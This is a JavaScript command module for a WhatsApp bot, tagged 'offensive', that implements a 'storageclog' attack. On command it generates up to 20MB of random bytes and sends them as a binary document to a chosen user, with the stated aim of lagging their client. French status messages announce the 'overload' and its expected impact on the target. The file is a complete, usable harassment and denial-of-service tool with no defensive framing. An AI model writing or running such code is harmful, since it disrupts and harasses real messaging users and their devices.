const { log } = require('../utils/logger');

module.exports = {
    name: 'storageclog',
    description: '💾 Storage-Clog: Sends a simulated massive document to cause client-side rendering lag.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            const strength = parseInt(args[1]) || 1;
            const sizeInMB = Math.min(strength * 5, 20); // Max 20MB

            await sock.sendMessage(chatId, { text: `💾 *STORAGE-CLOG OVERLOAD:* Génération de ${sizeInMB}MB de données parasites sur @${target.split('@')[0]}...`, mentions: [target] });

            // Sending a large high-entropy payload
            const payload = require('crypto').randomBytes(1024 * 1024 * sizeInMB);

            await sock.sendMessage(target, {
                document: payload,
                mimetype: 'application/octet-stream',
                fileName: `ABYSS_CORE_INFRA_STRESS_${sizeInMB}MB.bin`,
                caption: `⚠️ *OVERLOAD:* Phase ${strength} stressor deployed. Client saturation in progress...`
            });

            if (target !== chatId) {
                await sock.sendMessage(chatId, { text: `✅ *STORAGE-CLOG COMPLÉTÉ.* Le rendu client de la cible devrait être impacté.`, mentions: [target] });
            }

        } catch (error) {
            log.error('Error in STORAGECLOG:', error);
        }
    }
};
